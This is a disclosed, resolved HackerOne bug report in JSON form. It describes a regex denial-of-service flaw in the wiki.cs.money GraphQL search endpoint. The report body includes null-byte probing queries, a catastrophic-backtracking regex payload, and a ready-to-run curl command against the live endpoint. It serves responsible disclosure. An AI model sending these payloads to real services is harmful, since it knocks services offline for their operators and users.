{
  "id": 1000567,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDAwNTY3",
  "url": "https://hackerone.com/reports/1000567",
  "title": "ReDoS at wiki.cs.money graphQL endpoint (AND probably a kind of command injection)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-10-07T02:26:35.265Z",
  "submitted_at": "2020-10-07T02:26:35.361Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mvm",
    "url": "/mvm",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/BncW3eWdHixDm7WKqVo4udRD/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 48311,
    "url": "https://hackerone.com/cs_money",
    "handle": "cs_money",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/6zBhWTJ4KuDdcSg86WvWXrFV/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "CS Money",
      "twitter_handle": "csmoneytrade",
      "website": "https://cs.money",
      "about": "CS:GO trading platform that helps people to trade, buy, sell and search for the best skins and deals they could possibly find."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-10-27T19:30:34.805Z",
  "bug_reporter_agreed_on_going_public_at": "2020-10-16T15:33:28.140Z",
  "team_member_agreed_on_going_public_at": "2020-10-27T19:30:34.713Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThe endpoint /graphql has a vulnerable query operation named \"search\", that  can I send a Regex malformed parameter, in order to trick the original regular expression to a regex bomb expression. \n\n+ Payload with a \"common\" search, querying the value \"AAA\":\n\n```\nquery a { \n  search(q: \"AAA\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id \n \n }\n}\n```\n\nResponse:\n\n```\n{\n  \"data\": {\n    \"search\": [\n      {\n        \"_id\": \"sticker-baaa-ckstabber\",\n        \"weapon_id\": null,\n        \"rarity\": \"High Grade\",\n        \"collection\": null,\n        \"collection_id\": null\n      },\n      {\n        \"_id\": \"sticker-ork-waaagh\",\n        \"weapon_id\": null,\n        \"rarity\": \"High Grade\",\n        \"collection\": null,\n        \"collection_id\": null\n      }\n    ]\n  },\n  \"extensions\": {\n    \"tracing\": {\n      \"version\": 1,\n      \"startTime\": \"2020-10-07T02:07:55.251Z\",\n      \"endTime\": \"2020-10-07T02:07:55.516Z\",\n      \"duration\": 264270190,\n      \"execution\": {\n        \"resolvers\": [\n          {\n            \"path\": [\n              \"search\"\n            ],...[Resumed for convenience]\n        ]\n      }\n    }\n  }\n}\n```\n\nPay attention in this part of JSON response: \n\n```\n      \"startTime\": \"2020-10-07T02:07:55.251Z\",\n      \"endTime\": \"2020-10-07T02:07:55.516Z\",\n``` \n\n**It's about a instantaneously response time.**\n\nOk, now we're ready to play with this...\n\nYou can reveal the bug inserting \"\\u0000\" on \"q\" parameter, in order to display an error with part of the graph query.\n\n+ Payload A (see the error response):\n\n ```\nquery a { \n  search(q: \"\\u0000)\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id  \n }\n}\n ```\n\nResponse:\n\n```\n{\n  \"errors\": [\n    {\n      \"message\": \"value (?=.*\\u0000) must not contain null bytes\",\n      \"locations\": [\n        {\n          \"line\": 2,\n          \"column\": 3\n        }\n      ],\n      \"path\": [\n        \"search\"\n      ],\n      \"extensions\": {\n        \"code\": \"INTERNAL_SERVER_ERROR\"\n      }\n    }\n  ],\n....[Resumed]\n ```\n\n+ Payload B (reveal that this parameter filter a value with a regex)\n\n```\nquery a { \n  search(q: \"\\u0000)\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id  \n }\n}\n\n```\n\n Response:\n\n ```\n{\n  \"errors\": [\n    {\n      \"message\": \"Invalid regular expression: /(?=.*X))/: Unmatched ')'\",\n      \"locations\": [\n        {\n          \"line\": 2,\n          \"column\": 3\n        }\n...[Resumed]\n\n```\n\n\n## GraphQL Payload With Regex BOMB\n\n```\nquery a { \n  search(q: \"[a-zA-Z0-9]+\\\\s?)+$|^([a-zA-Z0-9.'\\\\w\\\\W]+\\\\s?)+$\\\\\", lang: \"en\") {\n    _id\n   weapon_id\n    rarity\n    collection{ _id name }\n    collection_id \n }\n}\n```\n\n\n## Steps To Reproduce:\n  1. Send a POST with the bomb payload: \n\n       ````\n   curl 'https://wiki.cs.money/graphql' \\  \n  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' \\\n  -H 'content-type: application/json' \\\n  -H 'accept: */*' \\     \n  --data-binary $'{\"query\":\"query a { \\\\n  search(q: \\\\\"[a-zA-Z0-9]+\\\\\\\\\\\\\\\\s?)+$|^([a-zA-Z0-9.\\'\\\\\\\\\\\\\\\\w\\\\\\\\\\\\\\\\W]+\\\\\\\\\\\\\\\\s?)+$\\\\\\\\\\\\\\\\\\\\\", lang: \\\\\"en\\\\\") {\\\\n    _id\\\\n   weapon_id\\\\n    rarity\\\\n    collection{ _id name }\\\\n    collection_id \\\\n \\\\n }\\\\n}\",\"variables\":null}' \\\n  --compressed\n       ```\n  1. Compare response times with a simple query \"AAA\"  (explained above)\n \n\n## Supporting Material/References:\nhttps://www.rexegg.com/regex-explosive-quantifiers.html\n\n## Impact\n\nDenial of Service",
  "bounty_amount": "250.0",
  "formatted_bounty": "$250",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1023378,
      "file_name": "recording-bug.webm",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mJmNfYwb7RG7ADxYGcyYdMUM?response-content-disposition=attachment%3B%20filename%3D%22recording-bug.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-bug.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T135640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fbf93177c9c971a42e7b037b51130b12eade6949ede242e6344890f07bde829c",
      "file_size": 4258739,
      "type": "video/webm",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 12,
  "voters": [
    "ali",
    "0nlymohammed",
    "elmahdi",
    "since2003",
    "rootishere",
    "official_blackhat13",
    "nafisaqil",
    "zeltric",
    "danchoidq9",
    "flok33",
    "and 2 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.7,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 45904,
    "asset_type": "URL",
    "asset_identifier": "wiki.cs.money",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
